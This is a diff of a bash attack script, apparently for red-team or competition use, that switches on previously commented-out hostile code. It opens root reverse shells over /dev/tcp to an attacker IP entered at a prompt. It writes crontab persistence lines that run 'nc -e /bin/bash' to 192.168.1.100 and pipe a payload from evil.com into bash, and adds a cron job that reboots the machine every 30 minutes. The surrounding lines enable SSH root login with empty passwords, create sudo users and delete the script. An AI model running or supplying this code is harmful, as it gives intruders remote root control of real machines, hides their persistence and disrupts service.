@@ -41,16 +41,18 @@ for nc_port in "${nc_ports[@]}"; do
   fi
 done
 
-#echo "Setting up reverse shell connections..." #connect to target with this {nc -lvnp <port>}
-#bash_ports=(5005 42069 6969 1234 12345 666 1111 1337)
-#for bash_port in "${bash_ports[@]}"; do
-#  if ! sudo netstat -anp | grep -q ":$bash_port "; then
-#    sudo bash -c "exec 5<>/dev/tcp/x.x.x.x/$bash_port; cat <&5 | while read line; do $line 2>&5 >&5; done" &
-#    echo "Reverse shell attempting connection to x.x.x.x:$bash_port"
-#  else
-#    echo "Port $bash_port already in use"
-#  fi
-#done
+read -p "Enter the attack box ip: " attacker_ip
+
+echo "Setting up reverse shell connections..." #connect to target with this {nc -lvnp <port>}
+bash_ports=(5005 42069 6969 1234 12345 666 1111 1337)
+for bash_port in "${bash_ports[@]}"; do
+  if ! sudo netstat -anp | grep -q ":$bash_port "; then
+    sudo bash -c "exec 5<>/dev/tcp/$attacker_ip/$bash_port; cat <&5 | while read line; do $line 2>&5 >&5; done" &
+    echo "Reverse shell attempting connection to $attacker_ip:$bash_port"
+  else
+    echo "Port $bash_port already in use"
+  fi
+done
 
 echo "Creating random users and adding to sudo/root groups..."
 
@@ -82,13 +84,13 @@ sed -i 's/^#\?PermitEmptyPasswords .*/PermitEmptyPasswords yes/' /etc/ssh/sshd_c
 systemctl restart sshd
 echo "--> SSH now allows root login and empty passwords!"
 
-#echo "Creating random cronjobs for persistence..."
-#echo "* * * * * root /bin/bash -c 'nc -e /bin/bash 192.168.1.100 5555'" >> /etc/crontab
-#echo "*/5 * * * * root /bin/bash -c 'wget -q -O - http://evil.com/payload.sh | bash'" >> /etc/crontab
-#echo "--> Cronjobs added!"
+echo "Creating random cronjobs for persistence..."
+echo "* * * * * root /bin/bash -c 'nc -e /bin/bash 192.168.1.100 5555'" >> /etc/crontab
+echo "*/5 * * * * root /bin/bash -c 'wget -q -O - http://evil.com/payload.sh | bash'" >> /etc/crontab
+echo "--> Cronjobs added!"
 # Add Goofy System Cronjobs
-#echo "*/30 * * * * root /sbin/shutdown -r now" >> /etc/crontab
-#echo "0 0 * * * root echo 'Kernel Panic' > /dev/console" >> /etc/crontab
+echo "*/30 * * * * root /sbin/shutdown -r now" >> /etc/crontab
+echo "0 0 * * * root echo 'Kernel Panic' > /dev/console" >> /etc/crontab
 
 
 
@@ -129,11 +131,6 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"  # Get the full path 
 cd "$HOME"  # Navigate to home directory to safely delete the folder
 echo "Deleting script and its directory: $SCRIPT_DIR"
 rm -rf "$SCRIPT_DIR"
-
-
-
-
-
 
 #runs on target (connect to target with this) nc -nv 172.18.219.197 443
 #sudo nc -lvnp 443 -e /bin/bash
